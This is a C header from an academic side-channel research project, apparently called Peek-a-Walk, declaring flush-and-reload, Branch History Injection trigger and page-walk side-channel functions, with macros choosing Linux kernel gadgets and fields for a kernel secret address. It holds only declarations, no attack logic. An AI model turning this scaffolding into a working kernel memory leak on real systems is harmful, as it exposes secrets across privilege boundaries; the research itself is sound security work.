/*
 *  Code credits to the Inspectre Gadget paper for the majority of the code here (for BHI) [1].
 *  Parts of the unmasked gadget code is taken from the SLAM paper [2]. 
 *  This code is also eidted to have the PWSC functionality we need. Code marked with PWSC
 *  is added by our work, Peek-a-Walk. 
 *  - Alan :) 
 * 
 *  [1] Inspectre Gadget by Weibing et al. https://github.com/vusec/inspectre-gadget 
 *  [2] SLAM by Hertogh et al. https://github.com/vusec/slam 
 */
#ifndef _FLUSH_AND_RELOAD_H_
#define _FLUSH_AND_RELOAD_H_

#include <stdint.h>

// define the unmasked gadget to use (only select one)
#define CGROUP_SEQFILE_SHOW
// #define EXT4_FILE_WRITE_ITER
// #define HUGETLBFS_READ_ITER
// #define KERNFS_SEQ_SHOW
// #define PROC_SIGNLE_SHOW
// #define RAW_SEQ_START
// #define SEL_READ_MLS

struct config {
    int fd;
    uint8_t * fr_buf;
    uint8_t * fr_buf_kern;
    uint8_t * reload_addr;
    uint8_t * ind_map;
    uint8_t * ind_map_kern;
    uint8_t * secret_addr;
    uint8_t * history;

    uint8_t * phys_start;
    uint8_t * phys_end;

    uint64_t * ind_tb_addr;
    uint64_t * ind_secret_addr;

};

uint64_t do_flush_and_reload(struct config * cfg, uint64_t iterations, uint8_t ret_on_hit);
void set_pwsc_load_chain(struct config * cfg, uint64_t target);
void setup_for_pwsc(struct config *cfg);

// pwsc interface functions
uint64_t setup_trigger_bhi(uint64_t target, uint64_t phase, uint64_t __trash);
uint64_t trigger_bhi(uint64_t target, uint64_t phase, uint64_t __trash);
uint64_t pre_pp_setup(uint64_t target, uint64_t phase, uint64_t __trash);

#endif //_FLUSH_AND_RELOAD_H_
